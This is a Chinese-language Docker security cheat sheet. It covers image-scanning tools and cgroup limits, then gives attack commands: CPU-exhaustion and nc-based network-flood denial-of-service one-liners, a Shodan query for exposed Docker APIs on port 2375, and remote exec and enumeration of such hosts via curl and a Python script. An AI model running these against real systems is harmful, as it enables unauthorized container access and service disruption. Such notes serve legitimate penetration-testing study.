# Docker服务

1.镜像扫描

[Docker Scout](https://docs.docker.com/scout/)
```bash
git clone https://github.com/docker/scout-demo-service.git
cd scout-demo-service
docker login
docker build --push -t <ORG_NAME>/scout-demo:v1 .

docker scout enroll <ORG_NAME>
    Successfully enrolled organization <ORG_NAME> with Docker Scout Free
docker scout repo enable --org <ORG_NAME> <ORG_NAME>/scout-demo

docker scout cves --only-package express
```

Docker Scan
```Bash
docker scan hello-world

Testing hello-world...

Organization:      docker-desktop-test
Package manager:   linux
Project name:      docker-image|hello-world
Docker image:      hello-world
Licenses:          enabled

✓ Tested 0 dependencies for known issues, no vulnerable paths found.

Note that we do not currently have vulnerability data for your image.
```

[trivy](https://github.com/aquasecurity/trivy)
```Bash
trivy -q -f json <container_name>:<tag>
```

[snyk](https://docs.snyk.io/snyk-cli/getting-started-with-the-cli)
```Bash
snyk container test <image> --json-file-output=<output file> --severity-threshold=high
```

[clair-scanner](https://github.com/arminc/clair-scanner)
```Bash
clair-scanner -w example-alpine.yaml --ip YOUR_LOCAL_IP alpine:3.5
```

2.cgroups
```Bash
docker run -it -m 500M --kernel-memory 50M --cpu-shares 512 --blkio-weight 400 --name ubuntu1 ubuntu bash
```

获取容器的cgroup
```Bash
docker run -dt --rm [images-name] sleep 200
ps -ef | grep 200
ls -l /proc/<PID>/ns
```

3.容器DOS

CPU DOS
```Bash
# stress-ng
sudo apt-get install -y stress-ng && stress-ng --vm 1 --vm-bytes 1G --verify -t 5m

# While
docker run -d --name malicious-container -c 512 busybox sh -c 'while true; do :; done'
```

网络DOS
```Bash
nc -lvp 4444 >/dev/null & while true; do cat /dev/urandom | nc <target IP> 4444; done
```

## 滥用API

Shodan：
```Bash
port:2375 product:"docker"
```

启用API
```Bash
/usr/lib/systemd/system/docker.service:
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock

systemctl daemon-reload
systemctl restart docker
```

```Bash
docker -H IP地址:端口 version  //查看Docker版本
docker -H IP地址:端口 images  //查看运行的镜像
docker -H IP地址:端口 exec -it 镜像ID /bin/bash  //远程访问容器

curl -X GET http://<远程主机IP>:2375/containers/json  //查看所有容器
curl -X GET http://<远程主机IP>:2375/images/json  //查看所有镜像
curl -X GET http://<远程主机IP>:2375/containers/<容器ID>/json  //查看特定容器的详细信息
curl -X GET http://<远程主机IP>:2375/images/<镜像ID>/json  //查看特定镜像的详细信息
```

使用Python脚本通过Docker API查看远程Docker靶机的容器和镜像信息
```python
import docker

client = docker.DockerClient(base_url='tcp://<远程主机IP>:2375')

# 查看所有容器
containers = client.containers.list(all=True)
for container in containers:
    print(container.id, container.name)

# 查看所有镜像
images = client.images.list()
for image in images:
    print(image.id, image.tags)
```
